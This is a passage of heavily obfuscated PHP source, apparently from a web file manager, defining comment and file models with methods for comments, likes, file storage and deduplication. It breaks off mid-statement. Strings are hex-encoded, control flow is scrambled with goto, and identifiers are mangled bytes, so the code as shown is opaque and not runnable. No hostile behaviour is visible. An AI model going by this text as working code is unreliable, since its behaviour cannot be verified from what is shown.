CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\141\155\145" => "\143\x6f\x6d\x6d\x65\x6e\164\x5f\x6d\x65\x74\x61", "\x6d\145\x74\141\106\151\145\x6c\144" => "\x63\157\155\x6d\x65\x6e\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Dèø©¢) { $eœ¶ÆºÏôÄ =& $_SERVER[¨¤¼…´]; if ($Dèø©¢[$eœ¶ÆºÏôÄ[2122]]) { $Bá½Ü™ô = $this->where(array($eœ¶ÆºÏôÄ[2123] => $Dèø©¢[$eœ¶ÆºÏôÄ[2122]]))->find(); if (!$Bá½Ü™ô || $Bá½Ü™ô[$eœ¶ÆºÏôÄ[383]] != $Dèø©¢[$eœ¶ÆºÏôÄ[383]] || $Bá½Ü™ô[$eœ¶ÆºÏôÄ[469]] != $Dèø©¢[$eœ¶ÆºÏôÄ[469]]) { return !1; } $this->where(array($eœ¶ÆºÏôÄ[2123] => $Dèø©¢[$eœ¶ÆºÏôÄ[2122]]))->setAdd($eœ¶ÆºÏôÄ[2124], 1); } $Dèø©¢[$eœ¶ÆºÏôÄ[2125]] = 0; $Dèø©¢[$eœ¶ÆºÏôÄ[2124]] = 0; $Dèø©¢[$eœ¶ÆºÏôÄ[679]] = 1; return $this->add($Dèø©¢); } public function remove($D‘ù¼ğë‹¡) { $f˜ÌÁ£Î’§ =& $_SERVER[¨¤¼…´]; $dÙ½÷¯ŞäÂ = array($f˜ÌÁ£Î’§[2123] => $D‘ù¼ğë‹¡); $bçÊêôòÚ¨ = $this->where($dÙ½÷¯ŞäÂ)->find(); if ($bçÊêôòÚ¨[$f˜ÌÁ£Î’§[2122]]) { $this->where(array($f˜ÌÁ£Î’§[2123] => $bçÊêôòÚ¨[$f˜ÌÁ£Î’§[2122]]))->setAdd($f˜ÌÁ£Î’§[2124], -1); } return $this->where($dÙ½÷¯ŞäÂ)->delete(); } public function edit($d¼ó¤ŒÍ×Ó, $aâ•êé•) { $A·ËŸ…Ğ«« =& $_SERVER[¨¤¼…´]; $fÌò†´ô = array($A·ËŸ…Ğ««[2123] => $d¼ó¤ŒÍ×Ó); return $this->where($fÌò†´ô)->save(array($A·ËŸ…Ğ««[2126] => $aâ•êé•)); } public function prasise($eó¾™ŞÂ») { $Cê×ÂÄÀ™¼ =& $_SERVER[¨¤¼…´]; $c…è‘ˆãñ² = Model($Cê×ÂÄÀ™¼[2127]); $eÔàÇÓ°° = array($Cê×ÂÄÀ™¼[2123] => $eó¾™ŞÂ», $Cê×ÂÄÀ™¼[1416] => USER_ID); $A¶‰¿‘ñ‚ = $c…è‘ˆãñ²->where($eÔàÇÓ°°)->find(); if (!$A¶‰¿‘ñ‚) { $c…è‘ˆãñ²->add($eÔàÇÓ°°); $E¼º…òå„ = $this->where(array($Cê×ÂÄÀ™¼[2123] => $eó¾™ŞÂ»))->setAdd($Cê×ÂÄÀ™¼[2125], 1); } else { $c…è‘ˆãñ²->where($eÔàÇÓ°°)->delete(); $E¼º…òå„ = $this->where(array($Cê×ÂÄÀ™¼[2123] => $eó¾™ŞÂ»))->setAdd($Cê×ÂÄÀ™¼[2125], -1); } return $E¼º…òå„; } public function targetInfo($aÃ“Øí–—Â, $EŠèçê½³) { goto eÖÜ®Úãñå; eÖÜ®Úãñå: $E‹„Šæ¨ù† =& $_SERVER[¨¤¼…´]; $f¾‚…‰»Â® = array($E‹„Šæ¨ù†[534] => $aÃ“Øí–—Â, $E‹„Šæ¨ù†[535] => $EŠèçê½³); $FñŸ©ø Ù = $this->where($f¾‚…‰»Â®)->count(); goto EË”Ş»ÁÉù; aŞ¹ÚŠĞ: return $bÅ†™ŸÂ¬‹; goto Eñ¿­•êÂ; EË”Ş»ÁÉù: $f‡¼ÌÈŠ¡º = "\x52\x49\x47\110\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\x63\157\155\155\145\x6e\x74\137\160\x72\141\151\x73\145\40\163\164\141\x72\x20\157\x6e\40\143\157\155\155\145\x6e\x74\x2e\143\157\x6d\155\x65\156\x74\111\104\x20\75\40\x73\164\141\162\x2e\x63\157\x6d\155\x65\x6e\x74\x49\x44"; $e™ùç©ğè = $this->alias($E‹„Šæ¨ù†[354])->where($f¾‚…‰»Â®)->join($f‡¼ÌÈŠ¡º, $E‹„Šæ¨ù†[2128])->count(); $bÅ†™ŸÂ¬‹ = array($E‹„Šæ¨ù†[2129] => $FñŸ©ø Ù, $E‹„Šæ¨ù†[2130] => $e™ùç©ğè); goto aŞ¹ÚŠĞ; Eñ¿­•êÂ: } public function listData($A»ëŸå•ŒÀ) { $B½Çêîº =& $_SERVER[¨¤¼…´]; if (isset($A»ëŸå•ŒÀ[$B½Çêîº[2131]])) { if ($A»ëŸå•ŒÀ[$B½Çêîº[2131]]) { $A»ëŸå•ŒÀ[$B½Çêîº[2132]] = array($B½Çêîº[914], intval($A»ëŸå•ŒÀ[$B½Çêîº[2131]])); } unset($A»ëŸå•ŒÀ[$B½Çêîº[2131]]); } if (isset($A»ëŸå•ŒÀ[$B½Çêîº[2133]])) { if ($A»ëŸå•ŒÀ[$B½Çêîº[2133]]) { $A»ëŸå•ŒÀ[$B½Çêîº[2132]] = array($B½Çêîº[911], intval($A»ëŸå•ŒÀ[$B½Çêîº[2133]])); } unset($A»ëŸå•ŒÀ[$B½Çêîº[2133]]); } return $this->_listData($A»ëŸå•ŒÀ); } private function _listData($CÜ·Í¯‰ó‡) { $b¶Å«é´ëí =& $_SERVER[¨¤¼…´]; $dï‡îÆï¡³ = $this->where($CÜ·Í¯‰ó‡)->_makeOrder()->selectPage(100); $this->_listAppendParent($dï‡îÆï¡³[$b¶Å«é´ëí[367]]); $this->_listAppendUser($dï‡îÆï¡³[$b¶Å«é´ëí[367]]); $this->_listAppendMeta($dï‡îÆï¡³[$b¶Å«é´ëí[367]]); return $dï‡îÆï¡³; } private function _makeOrder() { $eñøëã»´ =& $_SERVER[¨¤¼…´]; $d©áÒ„âÆ = array($eñøëã»´[2125], $eñøëã»´[2124], $eñøëã»´[201]); $a¬Â¿İ·ÙÔ = Input::get($eñøëã»´[419], $eñøëã»´[7], $eñøëã»´[401], $d©áÒ„âÆ); $böîã‡¼ = Input::get($eñøëã»´[420], $eñøëã»´[7], $eñøëã»´[1418], array($eñøëã»´[2134], $eñøëã»´[417])); $C–ŞÓåëé‘ = $a¬Â¿İ·ÙÔ . $eñøëã»´[60] . $böîã‡¼; return $this->order($C–ŞÓåëé‘); } private function _listAppendParent(&$C“ß÷ÍàÆŸ) { goto d§Ç°´•à; Dµ°¸”¢øá: foreach ($C“ß÷ÍàÆŸ as &$fË–ˆèñÈ…) { if (isset($dä©½·ÜÍÑ[$fË–ˆèñÈ…[$A³ÎîÀ×[2122]]])) { $fË–ˆèñÈ…[$A³ÎîÀ×[2135]] = $dä©½·ÜÍÑ[$fË–ˆèñÈ…[$A³ÎîÀ×[2122]]]; } } unset($fË–ˆèñÈ…); goto eÍ…¯ñ–Åß; d§Ç°´•à: $A³ÎîÀ× =& $_SERVER[¨¤¼…´]; $BŸ…‡ÌĞöÒ = array_unique(array_to_keyvalue($C“ß÷ÍàÆŸ, $A³ÎîÀ×[43], $A³ÎîÀ×[2122])); $BŸ…‡ÌĞöÒ = array_remove_value($BŸ…‡ÌĞöÒ, $A³ÎîÀ×[481]); goto bë¾ß¡„™; bë¾ß¡„™: if (!$BŸ…‡ÌĞöÒ) { return; } $dä©½·ÜÍÑ = $this->where(array($A³ÎîÀ×[2123] => array($A³ÎîÀ×[7], $BŸ…‡ÌĞöÒ)))->select(); $dä©½·ÜÍÑ = array_to_keyvalue($dä©½·ÜÍÑ, $A³ÎîÀ×[2132]); goto Dµ°¸”¢øá; eÍ…¯ñ–Åß: } private function _listAppendUser(&$DÌØ²¥À’) { goto BÊ¤‹§·ÃÀ; BÊ¤‹§·ÃÀ: $A½É÷âİñ =& $_SERVER[¨¤¼…´]; $cÕ«öğŠæ = array_unique(array_to_keyvalue($DÌØ²¥À’, $A½É÷âİñ[43], $A½É÷âİñ[1425])); $cÕ«öğŠæ = array_remove_value($cÕ«öğŠæ, $A½É÷âİñ[481]); goto A¢§Æîâ©‡; bìƒ÷¿¶»»: foreach ($DÌØ²¥À’ as &$Cá¢Ìß§ƒ™) { $Cá¢Ìß§ƒ™[$A½É÷âİñ[547]] = $cË×…Ç†¤è[$Cá¢Ìß§ƒ™[$A½É÷âİñ[1425]]]; if (isset($Cá¢Ìß§ƒ™[$A½É÷âİñ[2135]])) { $Cá¢Ìß§ƒ™[$A½É÷âİñ[2135]][$A½É÷âİñ[547]] = $cË×…Ç†¤è[$Cá¢Ìß§ƒ™[$A½É÷âİñ[2135]][$A½É÷âİñ[1425]]]; } } unset($Cá¢Ìß§ƒ™); goto cˆÜ¼ÊÍ÷á; A¢§Æîâ©‡: if (count($cÕ«öğŠæ) == 0) { return; } foreach ($DÌØ²¥À’ as $Cá¢Ìß§ƒ™) { if (isset($Cá¢Ìß§ƒ™[$A½É÷âİñ[2135]])) { $cÕ«öğŠæ[] = $Cá¢Ìß§ƒ™[$A½É÷âİñ[2135]][$A½É÷âİñ[1425]]; } } $cË×…Ç†¤è = Model($A½É÷âİñ[490])->userListInfo($cÕ«öğŠæ); goto bìƒ÷¿¶»»; cˆÜ¼ÊÍ÷á: } private function _listAppendMeta(&$DŒ¶„ñ©Ğ›) { goto b±ªäõÌ¯á; b±ªäõÌ¯á: $d×°Â£®íÊ =& $_SERVER[¨¤¼…´]; $f‰ªîºÂ‚ï = array_unique(array_to_keyvalue($DŒ¶„ñ©Ğ›, $d×°Â£®íÊ[43], $d×°Â£®íÊ[2132])); $f‰ªîºÂ‚ï = array_remove_value($f‰ªîºÂ‚ï, $d×°Â£®íÊ[481]); goto BÑÀ§Çø ‘; BÑÀ§Çø ‘: if (!$f‰ªîºÂ‚ï) { return; } foreach ($DŒ¶„ñ©Ğ› as $aœòÃŒÎ£) { if (isset($aœòÃŒÎ£[$d×°Â£®íÊ[2135]])) { $f‰ªîºÂ‚ï[] = $aœòÃŒÎ£[$d×°Â£®íÊ[2135]][$d×°Â£®íÊ[2132]]; } } $B½ì–Æ²ƒ† = $this->metaList($f‰ªîºÂ‚ï); goto D²¤ò‚¤£; D²¤ò‚¤£: if (!$B½ì–Æ²ƒ†) { return !1; } foreach ($DŒ¶„ñ©Ğ› as &$aœòÃŒÎ£) { $aœòÃŒÎ£[$d×°Â£®íÊ[429]] = $B½ì–Æ²ƒ†[$aœòÃŒÎ£[$d×°Â£®íÊ[2132]]]; if (isset($aœòÃŒÎ£[$d×°Â£®íÊ[2135]])) { $aœòÃŒÎ£[$d×°Â£®íÊ[2135]][$d×°Â£®íÊ[429]] = $B½ì–Æ²ƒ†[$aœòÃŒÎ£[$d×°Â£®íÊ[2135]][$d×°Â£®íÊ[2132]]]; } } unset($aœòÃŒÎ£); goto cÏƒ÷¸©Õ¬; cÏƒ÷¸©Õ¬: } private function metaList($A‰Õ‚Ú•Â) { goto B÷Š‰†›«±; c©‹Ó¥—ˆ: $B“¼®ñğ³Ë = Model($bÆƒØ¥¨ïô[2136])->where($A”êÜÔŠ¸á)->select(); $B“¼®ñğ³Ë = array_to_keyvalue_group($B“¼®ñğ³Ë, $bÆƒØ¥¨ïô[2132]); foreach ($B“¼®ñğ³Ë as $FªÅÒƒŸ => $A¿²±Ö£èÚ) { $CÀ¾ÎŸÊÖª = array(); foreach ($A¿²±Ö£èÚ as $A©‹ğğÌóŠ) { $CÀ¾ÎŸÊÖª[$A©‹ğğÌóŠ[$bÆƒØ¥¨ïô[99]]] = $A©‹ğğÌóŠ[$bÆƒØ¥¨ïô[372]]; } $B“¼®ñğ³Ë[$FªÅÒƒŸ] = $CÀ¾ÎŸÊÖª; } goto eŠò™æ¥Ö·; eŠò™æ¥Ö·: return $B“¼®ñğ³Ë ? $B“¼®ñğ³Ë : array(); goto E´·ìÂŞµÃ; B÷Š‰†›«±: $bÆƒØ¥¨ïô =& $_SERVER[¨¤¼…´]; if (!$A‰Õ‚Ú•Â) { return array(); } $A”êÜÔŠ¸á = array($bÆƒØ¥¨ïô[2132] => array($bÆƒØ¥¨ïô[7], $A‰Õ‚Ú•Â)); goto c©‹Ó¥—ˆ; E´·ìÂŞµÃ: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\154\145"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\155\145" => "\151\157\137\146\x69\154\x65\x5f\155\145\x74\141", "\x6d\145\x74\x61\x46\151\x65\x6c\144" => "\146\151\x6c\145\x49\104"); public function fileInfo($f¼â™¦°ˆì) { $A º­¾ÙÌˆ =& $_SERVER[¨¤¼…´]; static $Eó†ËîË©” = array(); if (!isset($Eó†ËîË©”[$f¼â™¦°ˆì])) { $C‘ÅÏ¤Îì¨ = $A º­¾ÙÌˆ[2137]; $eÏ³…Á¬ = Model($A º­¾ÙÌˆ[434])->field($C‘ÅÏ¤Îì¨)->where(array($A º­¾ÙÌˆ[432] => $f¼â™¦°ˆì))->find(); $Eó†ËîË©”[$f¼â™¦°ˆì] = $eÏ³…Á¬; } return $Eó†ËîË©”[$f¼â™¦°ˆì]; } public function addFileByContent($c´™ÖÎ©‚ñ = '', $DäÚî‡‹¼ = '') { goto aÅ³»ÃÌ©À; Eò÷–•—œŸ: if (file_exists($F‘´Ğ•£ãí)) { @unlink($F‘´Ğ•£ãí); } return $aØ¡±É¬–; goto Aá‘—‰ñÜ; Aœº«ñ‰àÊ: $F‘´Ğ•£ãí = $c«“·©®¨× . $FÇîæÈâ–²[2139] . rand_string(16); file_put_contents($F‘´Ğ•£ãí, $c´™ÖÎ©‚ñ); $aØ¡±É¬– = $this->addFile($F‘´Ğ•£ãí, $DäÚî‡‹¼, !0); goto Eò÷–•—œŸ; aÅ³»ÃÌ©À: $FÇîæÈâ–² =& $_SERVER[¨¤¼…´]; $c«“·©®¨× = TEMP_PATH . $FÇîæÈâ–²[2138]; if (!is_dir($c«“·©®¨×)) { mk_dir($c«“·©®¨×); } goto Aœº«ñ‰àÊ; Aá‘—‰ñÜ: } public function createFileName($Eªç‘•Öİ) { goto FÓ ØŞ¿‰; då»‹ÃâÑ•: $bÓ‚±ÄÖÎÇ = $fÖç¢‹Ï™•->pathFather($f¯Ğ¬±ÕØï); static $e•„íã¡ù° = false; $fœØÅÅçì = $Eå”ù¨ä˜ê[2140] . md5($bÓ‚±ÄÖÎÇ); goto b½ÙíÄàâë; FÓ ØŞ¿‰: $Eå”ù¨ä˜ê =& $_SERVER[¨¤¼…´]; $fÖç¢‹Ï™• = IO::init($Eå”ù¨ä˜ê[8]); $f¯Ğ¬±ÕØï = $this->makeFilePath($Eªç‘•Öİ, $fÖç¢‹Ï™•); goto då»‹ÃâÑ•; b½ÙíÄàâë: if (!$e•„íã¡ù° && !Cache::get($fœØÅÅçì)) { $e•„íã¡ù° = !0; $b»Ü—Ã¶‰ = IO::mkdir($bÓ‚±ÄÖÎÇ); if (!IO::exist($b»Ü—Ã¶‰ . $Eå”ù¨ä˜ê[2141])) { IO::mkfile($b»Ü—Ã¶‰ . $Eå”ù¨ä˜ê[2141]); } Cache::set($fœØÅÅçì, 1, 3600 * 2); } return $f¯Ğ¬±ÕØï; goto DŸ†Æ¤Ñ˜; DŸ†Æ¤Ñ˜: } public function makeFilePath($BİÖàâ»ë, $bØˆ¹É©ÎÄ) { goto dÕº«ÚÆÒÈ; F—‚ºçñŒ†: $FÎ„óâ‡ò = $d±ªëÒğ¹¨ . rand_string(5) . short_id(100); $BİÖàâ»ë = str_replace($b¹£‘Õ™Ô®[8], $b¹£‘Õ™Ô®[80], KodIO::clear($BİÖàâ»ë)); if (!$BİÖàâ»ë) { $eÒù•—ƒßˆ = $b¹£‘Õ™Ô®[2144]; } goto aùùø¿İ½; dÕº«ÚÆÒÈ: $b¹£‘Õ™Ô® =& $_SERVER[¨¤¼…´]; $eÒù•—ƒßˆ = Model($b¹£‘Õ™Ô®[1078])->get($b¹£‘Õ™Ô®[2142]); $d±ªëÒğ¹¨ = KodIO::defaultIO() . date($b¹£‘Õ™Ô®[2143]); goto F—‚ºçñŒ†; aùùø¿İ½: switch ($eÒù•—ƒßˆ) { case $b¹£‘Õ™Ô®[2145]: $FÎ„óâ‡ò = $FÎ„óâ‡ò . $b¹£‘Õ™Ô®[101] . $bØˆ¹É©ÎÄ->ext($BİÖàâ»ë); if ($bØˆ¹É©ÎÄ->ext($BİÖàâ»ë) == $b¹£‘Õ™Ô®[2085]) { $FÎ„óâ‡ò .= $b¹£‘Õ™Ô®[1327]; } break; case $b¹£‘Õ™Ô®[2146]: goto cö‰ŒÀôİˆ; cŒİÈ¡¼óé: $d±ªëÒğ¹¨ = $b¹£‘Õ™Ô®[2147] . $Bàì¬Ò–‡¯[$b¹£‘Õ™Ô®[379]] . $b¹£‘Õ™Ô®[2148] . date($b¹£‘Õ™Ô®[2149]) . $d‚Ü´×¼­ . $b¹£‘Õ™Ô®[8]; if ($bØˆ¹É©ÎÄ->ext($BİÖàâ»ë) == $b¹£‘Õ™Ô®[2085]) { $BİÖàâ»ë .= $b¹£‘Õ™Ô®[1327]; } $FÛÇë‹Ù±¬ = $b¹£‘Õ™Ô®[2150] . $d±ªëÒğ¹¨ . $BİÖàâ»ë; goto C¬Ü˜ôÕ³; C¬Ü˜ôÕ³: CacheLock::lock($FÛÇë‹Ù±¬); $fŠÁŠÁŒˆ£ = IO::fileNameAuto($d±ªëÒğ¹¨, $BİÖàâ»ë); $FÎ„óâ‡ò = $d±ªëÒğ¹¨ . $fŠÁŠÁŒˆ£; goto cÅîãİ»±†; cÅîãİ»±†: if (IO::isTypeObject($FÎ„óâ‡ò) && !IO::isUploadServer($FÎ„óâ‡ò)) { IO::setContent($FÎ„óâ‡ò, $b¹£‘Õ™Ô®[43]); } CacheLock::unlock($FÛÇë‹Ù±¬); break; goto E»‰íÚ‡×ì; cö‰ŒÀôİˆ: $c°›‚¯§ìï = Model($b¹£‘Õ™Ô®[1078])->get($b¹£‘Õ™Ô®[1323]); $d‚Ü´×¼­ = substr(md5($b¹£‘Õ™Ô®[1903] . $c°›‚¯§ìï . date($b¹£‘Õ™Ô®[677])), 0, 8); $Bàì¬Ò–‡¯ = KodIO::defaultDriver(); goto cŒİÈ¡¼óé; E»‰íÚ‡×ì: case $b¹£‘Õ™Ô®[2144]: break; default: break; } return $FÎ„óâ‡ò; goto E»ŒÏ©·µ“; E»ŒÏ©·µ“: } public function addFileByRemote($aæ¢ÇÓÊÚÀ, $Dô“ÅÓ†¡İ, $AÅÄ¬ğÌ®ô = array()) { goto dß“ª±Äˆ; dß“ª±Äˆ: $EÖÒ„ÇÜ‡ =& $_SERVER[¨¤¼…´]; if (!IO::exist($aæ¢ÇÓÊÚÀ)) { return !1; } $EØËöÖ†¿ù = $AÅÄ¬ğÌ®ô[$EÖÒ„ÇÜ‡[177]] ? $AÅÄ¬ğÌ®ô[$EÖÒ„ÇÜ‡[177]] : $EÖÒ„ÇÜ‡[43]; goto A¨–ø¿Œ–™; A¨–ø¿Œ–™: $c…©÷äªÉº = IO::hashMd5($aæ¢ÇÓÊÚÀ, $EØËöÖ†¿ù); $EÙ‰¦¶†‰ = KodIO::defaultDriver(); $D¦½”•  = array($EÖÒ„ÇÜ‡[533] => IO::size($aæ¢ÇÓÊÚÀ), $EÖÒ„ÇÜ‡[2151] => 1, $EÖÒ„ÇÜ‡[398] => $Dô“ÅÓ†¡İ, $EÖÒ„ÇÜ‡[725] => $EÙ‰¦¶†‰[$EÖÒ„ÇÜ‡[379]], $EÖÒ„ÇÜ‡[399] => $aæ¢ÇÓÊÚÀ, $EÖÒ„ÇÜ‡[2152] => $AÅÄ¬ğÌ®ô[$EÖÒ„ÇÜ‡[178]] ? $AÅÄ¬ğÌ®ô[$EÖÒ„ÇÜ‡[178]] : IO::hashSimple($aæ¢ÇÓÊÚÀ), $EÖÒ„ÇÜ‡[2153] => $c…©÷äªÉº ? $c…©÷äªÉº : $EØËöÖ†¿ù); goto DçæÔñø°Æ; DçæÔñø°Æ: if ($E÷‘§’ƒñ• = $this->addFileCheckExist($D¦½”• [$EÖÒ„ÇÜ‡[178]], $D¦½”• [$EÖÒ„ÇÜ‡[177]], $D¦½”• [$EÖÒ„ÇÜ‡[87]])) { return $E÷‘§’ƒñ•; } return $this->addFileData($D¦½”• ); goto a£çÒíÛß‰; a£çÒíÛß‰: } private function addFileData($Cêôç«¦Í—) { $aö‡¶¤À›è =& $_SERVER[¨¤¼…´]; if (!$Cêôç«¦Í—) { return !1; } $Cêôç«¦Í—[$aö‡¶¤À›è[87]] = intval($Cêôç«¦Í—[$aö‡¶¤À›è[87]]); if (!$Cêôç«¦Í—[$aö‡¶¤À›è[87]] && strlen($Cêôç«¦Í—[$aö‡¶¤À›è[178]]) > 32) { $Cêôç«¦Í—[$aö‡¶¤À›è[87]] = intval(substr($Cêôç«¦Í—[$aö‡¶¤À›è[178]], 32)); } $EïäÜ«¯®Ÿ = $this->add($Cêôç«¦Í—); return $this->find($EïäÜ«¯®Ÿ); } public function addFile($b‰»äİ¯²ï, $C¼ÑÄ¹‚³…, $b­‘óÇÄÄ = false) { goto BŒ­óİŞ÷; BŒ­óİŞ÷: $f«Óó”œ¦ = IO::hashSimple($b‰»äİ¯²ï); $EµøÀ£µ´Ø = IO::hashMd5($b‰»äİ¯²ï); $BÂµäˆÄö‹ = IO::size($b‰»äİ¯²ï); goto A–ùš–ÏĞÌ; aŒÀÇô‘: $E›°ãË½¨ = $this->addFileMake($b‰»äİ¯²ï, $BÂµäˆÄö‹, $f«Óó”œ¦, $EµøÀ£µ´Ø, $C¼ÑÄ¹‚³…, $b­‘óÇÄÄ); $BšÒ»Ì¤Ì  = $this->addFileData($E›°ãË½¨); CacheLock::unlock($EƒÅá…®¢í); goto AÙ¥®«””ó; A–ùš–ÏĞÌ: $EƒÅá…®¢í = $_SERVER[¨¤¼…´][2154] . $EµøÀ£µ´Ø; CacheLock::lock($EƒÅá…®¢í); if ($B£æŒ‡Ùñæ = $this->addFileCheckExist($f«Óó”œ¦, $EµøÀ£µ´Ø, $BÂµäˆÄö‹)) { CacheLock::unlock($EƒÅá…®¢í); return $B£æŒ‡Ùñæ; } goto aŒÀÇô‘; AÙ¥®«””ó: return $BšÒ»Ì¤Ì ; goto f¨”é…‰İİ; f¨”é…‰İİ: } public function addFileMake($b»ä¡Ú®ãæ, $Aù†£ñáÉ, $EÚ²Û²¶—™, $FÉÏ•ß×Ô, $C£ªÉ”×¥«, $DƒËæØ¦ŸØ) { goto fäµÚ®‘Íğ; fäµÚ®‘Íğ: $cÃœ–‡åÂÇ =& $_SERVER[¨¤¼…´]; $c÷Ó„¯çŒí = $this->createFileName($C£ªÉ”×¥«); $f¬™±™« = get_path_father($c÷Ó„¯çŒí); goto C¢‚ŒßŒ˜; C¢‚ŒßŒ˜: $fÃ§“ãôÑ¿ = get_path_this($c÷Ó„¯çŒí); if ($DƒËæØ¦ŸØ) { $bØ¬¡­¦´å = IO::move($b»ä¡Ú®ãæ, $f¬™±™«, !1, $fÃ§“ãôÑ¿); } else { $bØ¬¡­¦´å = IO::copy($b»ä¡Ú®ãæ, $f¬™±™«, !1, $fÃ§“ãôÑ¿); } if (!$bØ¬¡­¦´å) { return !1; } goto cõÚÇŠœ¶; cõÚÇŠœ¶: $F•÷³’›È¼ = KodIO::defaultDriver(); $bĞµÚ¨Á¾ = array($cÃœ–‡åÂÇ[533] => $Aù†£ñáÉ, $cÃœ–‡åÂÇ[2151] => 1, $cÃœ–‡åÂÇ[398] => $C£ªÉ”×¥«, $cÃœ–‡åÂÇ[725] => $F•÷³’›È¼[$cÃœ–‡åÂÇ[379]], $cÃœ–‡åÂÇ[399] => $c÷Ó„¯çŒí, $cÃœ–‡åÂÇ[2152] => $EÚ²Û²¶—™, $cÃœ–‡åÂÇ[2153] => $FÉÏ•ß×Ô); return $bĞµÚ¨Á¾; goto e½Šˆõ·®Ã; e½Šˆõ·®Ã: } public function addFileCheckExist($aë‡×‡Œ…è, $e—¼©Ì°º, $cŠÒ‡Ò˜ƒ) { $AÊ´ÈÇíŒù =& $_SERVER[¨¤¼…´]; $Eøİ¶‚Ø°£ = $this->findByHash($aë‡×‡Œ…è, $e—¼©Ì°º); if (!$Eøİ¶‚Ø°£) { return !1; } $bÛÍ¡¬Õ”Ÿ = array($AÊ´ÈÇíŒù[2151] => intval($Eøİ¶‚Ø°£[$AÊ´ÈÇíŒù[2155]]) + 1, $AÊ´ÈÇíŒù[533] => $cŠÒ‡Ò˜ƒ); $this->where(array($AÊ´ÈÇíŒù[432] => $Eøİ¶‚Ø°£[$AÊ´ÈÇíŒù[431]]))->save($bÛÍ¡¬Õ”Ÿ); return $Eøİ¶‚Ø°£; } public function remove($A›¦½Š×ñ) { $this->linkCountChange($A›¦½Š×ñ, !1); $this->clearEmpty(); return !0; } public function linkAdd($cÀ ç¦ø) { $this->linkCountChange($cÀ ç¦ø, !0); } public function linkCountChange($f‘¶òİ¾ë, $A¢öéùÔÛ¬) { goto E¤ê¨Ë¡¿ˆ; E¤ê¨Ë¡¿ˆ: $AÆÌ©ø¬—– =& $_SERVER[¨¤¼…´]; if (!$f‘¶òİ¾ë) { return; } if (!is_array($f‘¶òİ¾ë)) { $f‘¶òİ¾ë = array($f‘¶òİ¾ë); } goto A³ÏøŠ‰è; A³ÏøŠ‰è: $dÉõÔ·Œ = array(); foreach ($f‘¶òİ¾ë as $C½ÀÁ„İÕ•) { $EİÛ¦‰ÍÇ = $C½ÀÁ„İÕ• . $AÆÌ©ø¬—–[43]; if (!$dÉõÔ·Œ[$EİÛ¦‰ÍÇ]) { $dÉõÔ·Œ[$EİÛ¦‰ÍÇ] = 0; } $dÉõÔ·Œ[$EİÛ¦‰ÍÇ]++; } $a›©ÛÍå¸Ş = array(); goto F¥÷º¾•£˜; F¥÷º¾•£˜: foreach ($dÉõÔ·Œ as $C½ÀÁ„İÕ• => $B£¨ƒ¥ˆÑƒ) { $EİÛ¦‰ÍÇ = $B£¨ƒ¥ˆÑƒ . $AÆÌ©ø¬—–[43]; if (!$a›©ÛÍå¸Ş[$EİÛ¦‰ÍÇ]) { $a›©ÛÍå¸Ş[$EİÛ¦‰ÍÇ] = array(); } $a›©ÛÍå¸Ş[$EİÛ¦‰ÍÇ][] = $C½ÀÁ„İÕ•; } foreach ($a›©ÛÍå¸Ş as $B£¨ƒ¥ˆÑƒ => $B’ƒ¦–Ò¤±) { if (!$B’ƒ¦–Ò¤±) { continue; } $B£¨ƒ¥ˆÑƒ = $A¢öéùÔÛ¬ ? $B£¨ƒ¥ˆÑƒ : -intval($B£¨ƒ¥ˆÑƒ); $a³Ş‹ÚÜóæ = array($AÆÌ©ø¬—–[431] => array($AÆÌ©ø¬—–[7], $B’ƒ¦–Ò¤±)); if ($B£¨ƒ¥ˆÑƒ < 0) { $a³Ş‹ÚÜóæ[$AÆÌ©ø¬—–[2155]] = array($AÆÌ©ø¬—–[915], abs($B£¨ƒ¥ˆÑƒ)); } $this->where($a³Ş‹ÚÜóæ)->setAdd($AÆÌ©ø¬—–[2155], $B£¨ƒ¥ˆÑƒ); } goto cˆ‚¿Ê÷š; cˆ‚¿Ê÷š: } public function findByHash($D×ÃøŞº˜, $bá¿Š¯ª£õ = false) { $BÎ‹Ñ¿Åš =& $_SERVER[¨¤¼…´]; if (!$D×ÃøŞº˜ && !$bá¿Š¯ª£õ) { return !1; } $CÕµ¬æš = array($BÎ‹Ñ¿Åš[2152] => $D×ÃøŞº˜); if ($bá¿Š¯ª£õ) { $CÕµ¬æš = array($BÎ‹Ñ¿Åš[2153] => $bá¿Š¯ª£õ); } return $this->order($BÎ‹Ñ¿Åš[2156])->where($CÕµ¬æš)->find(); } public function clearEmpty($AÄïæ‹Â‰‘ = 0) { goto C¾«ÖéÛâÈ; CæÒÌ„ç»ó: $bªšßˆˆœŸ = $this->where($B¨õğ›¸£¼)->select(); if (!$bªšßˆˆœŸ) { return; } $e‚¾Ã³‹ â = new Task($f¡´Œ˜Ô„[2158], $f¡´Œ˜Ô„[43], count($bªšßˆˆœŸ)); goto aèõ¤õêéí; C¾«ÖéÛâÈ: $f¡´Œ˜Ô„ =& $_SERVER[¨¤¼…´]; $Fì”Ù§ÄîÊ = time() - 3600 * 24 * $AÄïæ‹Â‰‘; $B¨õğ›¸£¼ = $f¡´Œ˜Ô„[2157] . $Fì”Ù§ÄîÊ; goto CæÒÌ„ç»ó; aèõ¤õêéí: foreach ($bªšßˆˆœŸ as $c÷ìÑµÀÊğ) { $e‚¾Ã³‹ â->update(1); $this->resetFile($c÷ìÑµÀÊğ); } $e‚¾Ã³‹ â->end(); goto c¡¬°µ; c¡¬°µ: } public function resetFile($cä©–ˆòÒï) { goto c°ßÌ©Åƒî; c°ßÌ©Åƒî: $EèøÊÕàÒ =& $_SERVER[¨¤¼…´]; $D¡¿ÙÃÕ’È = array($EèøÊÕàÒ[432] => $cä©–ˆòÒï[$EèøÊÕàÒ[431]]); $CÛÂáÜ„Ã = Model($EèøÊÕàÒ[1107])->where($D¡¿ÙÃÕ’È)->count(); goto c«İ‚¥¼¬; b°„Í·‚äù: if ($cä©–ˆòÒï[$EèøÊÕàÒ[2155]] != $B­œµøÈ¶÷) { $this->where($D¡¿ÙÃÕ’È)->save(array($EèøÊÕàÒ[2151] => 